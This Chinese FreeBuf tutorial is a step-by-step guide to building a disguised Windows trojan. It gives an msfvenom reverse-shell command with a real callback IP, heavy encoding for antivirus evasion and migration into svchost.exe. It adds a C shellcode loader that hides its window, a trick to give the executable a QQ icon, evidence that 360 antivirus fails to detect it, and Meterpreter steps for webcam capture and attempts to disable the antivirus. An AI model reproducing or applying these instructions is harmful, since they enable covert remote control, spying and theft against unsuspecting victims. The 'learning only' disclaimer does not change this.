***本文原创作者：cureall，本文属FreeBuf原创奖励计划，未经许可禁止转载**

 **PS：本文仅用于技术交流与分享，严禁用于非法用途**

![698050_f493_3.jpg](https://image.3001.net/images/20180402/15226655915258.jpg!small)  

##  **一. 配置ngrok准备内网穿透**

 **内网穿透的必要性和原理就不用说了，直接说操作。首先到ngrok官网去注册一个号，国内也有一个sunny
ngrok，但是我用了几次全失败了，所以推荐国外的，网址是：<https://ngrok.com/>。**

我注册的时候面临验证码刷不出来，所以建议选择用github账号登陆就好。登陆好之后就在kali下载好对应版本的客户端。下载好之后你需要在kali上用他给你的凭证进行登陆
----命令行输入

./ngrok authtoken （你的凭证字符串）。

凭证可以在官网上复制。

  

![Clipboard
Image.png](https://image.3001.net/images/20180328/15222231054352.png!small)  

然后接着输入：

    
    
    ./ngrok tcp 1234

这的1234是你本地的端口，出现如下画面说明你成功了,然后让他一直开着。

![Clipboard
Image.png](https://image.3001.net/images/20180328/15222231234855.png!small)  

左边就是给你用的端口，右边就是你本地的端口

然后你可以通过ping这个给你的网址得到IP，这个是ping不通的，不过可以得到IP就可以了。这个每次重新穿透的时候都会更换远程端口，这是比较egg疼的，不过免费嘛，算可以了。

![Clipboard
Image.png](https://image.3001.net/images/20180328/15222239739036.png!small)  

## **二.木马的伪装与简单免杀**

木马面临的最基本的问题就是免杀，如果不能免杀，被杀毒软件发现，其作用几乎为零，至于怎么感染别人，就得看你的忽悠能力或者USB的方式，但是首要的应该是免杀。

我采用的是比较简单的免杀方式，依靠msf生成的shellcode免杀。

在命令行输入：

    
    
    msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=52.14.61.47 LPORT=13098 -e x86/shikata_ga_nai -i 15 -b '\x00\' PrependMigrate=true PrependMigrateProc=svchost.exe -f c > /root/Desktop/shellcode.c

这里的paylload选择windows/meterpreter/reverse_tcp，LHOST和LPORT分别填ngrok给你的网址和端口，-e
x86/shikata_ga_nai -i 15是用-e x86/shikata_ga_nai编码15次，而PrependMigrate=true
PrependMigrateProc=svchost.exe使这个程序默认会迁移到svchost.exe进程，自己测试的时候不建议到这个进程而是其他的持久进程，这样别人打开之后就无法再常规的去关闭回连的会话。你还可以使用windows/meterpreter/reverse_tcp_rc4这个payload,对会话进行加密，增加免杀能力。  

相信大家都试过，直接输出exe文件就算注入其他软件和进行编码n遍也会马上被查杀出来。多次测试发现用x86/shikata_ga_na编码超过12次以上再通过shellcode编译出来都能免杀。

如下图你的桌面会有一个shellcode.c文件

![Clipboard
Image.png](https://image.3001.net/images/20180328/15222231529524.png!small)  

将其移到 windows,用记事本打开会有 ：unsigned char buf[] =”一长串数字”

接着就开始编译木马，我使用的是vs2015

> 下载链接：：<https://pan.baidu.com/s/1BgxZeCTZoFvpm_lhxcRXCw> 密码：bchi

在visual studio下新建一个c++的win32项目将以下代码模板复制进去，在把你得到的shellcode那长串数字复制到shellcode的位置。

    
    
    #include<stdio.h>
    
    #include<windows.h>
    
    #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")                        //去除窗口
    
    unsigned char shellcode[]= （这里就是shellcode）
    
    void main()
    
    {
    
     LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
     memcpy(Memory, shellcode, sizeof(shellcode));
    
     ((void(*)())Memory)();
    
    }

编译方法网上有很多种，这个时候已经可以编译了，但是我们还可以对图标进行更改伪装：右击你的项目--->添加--->资源--->图标--->新建,再用电脑的搜索查找*.icon，找到
QQ的图标找到你这个项目的文件夹下会有一个1icon.ico文件，将QQ的图标改成1icon.ico，拖进去替换掉原来的那个图标文件

![Clipboard
Image.png](https://image.3001.net/images/20180328/15222233089044.png!small)

然后vs平台就会出现下图：  

![Clipboard
Image.png](https://image.3001.net/images/20180328/15222232881287.png!small)  

  

这个时候你再编译出来就会是一个QQ图标的木马。具体情况下你可以以此方法任意改图标再重命名，使你的木马更加具有迷惑性。

![Clipboard
Image.png](https://image.3001.net/images/20180328/15222233293651.png!small)  

我们再使用国内普遍的360杀毒软件测试一下效果，证明可以免杀了

![Clipboard
Image.png](https://image.3001.net/images/20180328/15222233402925.png!small)  

只要在不影响shellcode的情况下，你可以对这个程序再增加扩展（就看你的c语言功底了），比如这里使用#pragma
comment(linker,"/subsystem:\"windows\"
/entry:\"mainCRTStartup\"")隐藏程序窗口，并用这个程序取代快捷方式，再通过这个程序调用原来真正的程序基本就神不知鬼不觉了。

其次就是建议各位在测试自己的木马时一定要关闭云端上传功能，360会收集可以软件，上传云端检测，然后备份通杀，所以你的木马没准今天还可以免杀，明天就全国联保了。心疼被吃的一个马。

![Clipboard
Image.png](https://image.3001.net/images/20180328/15222233941056.png!small)

## **三.meterpreter后渗透功能测试**

先配置好监听端

    
    
    use exploit/multi/handler
    
    set payload windows/meterpreter/reverse_tcp
    
    set LHOST 127.0.0.1
    
    set LPORT 1234
    
    exploit

注意LHOST和LPORT配置为之前和ngrok绑定的本地的端口!!

![Clipboard
Image.png](https://image.3001.net/images/20180328/15222234114106.png!small)

然后等待别人运行我们的木马。如下就是成功了。

![Clipboard
Image.png](https://image.3001.net/images/20180328/15222234207132.png!small)  

然后我让远在异地的女友和我的室友帮我测试了一下，结果也是成功的，具体你们也可以试试。这个时候你基本可以操控很多功能了。

但是我又发现360的行为检测会阻止meterpreter许多功能，简单的getsystem提权绝对失败，通过哈希传递和假冒令牌的方式提权，都会被报可疑程序在调用驱动，甚至拍照都会报可以程序在调用摄像头（部分电脑不会报）

然后msf会收到一张360的调戏图：

![Clipboard
Image.png](https://image.3001.net/images/20180328/15222234453315.png!small)  

但是你接着第二次使用：

    
    
    Webcam_snap 1

又不会报并且拍照成功（很奇怪）

再至于常规的持久化控制命令不是失败就是会被360查杀

并将我们的木马曝光（十分危险），而如果尝试关闭360的进程则其核心进程又无法关闭，又尝试运行360的卸载程序，结果又报可以程序在调用360部分文件，非常恼火。

据说通过删除系统文件夹就可以卸载360了，不过不建议，因为那等于暴露了。

希望这篇文章能够帮助大家的学习，但是这些技术仅供学习使用，切不可用这些技术做非法的事，合法上网从我做起

以上就是对于msf的简单利用，我还是一个渗透学习路上的菜鸟，欢迎大家提出过程中的问题，或者为后渗透的问题提供解决办法和思路，谢谢大家

 ***本文原创作者：cureall，本文属FreeBuf原创奖励计划，未经许可禁止转载**

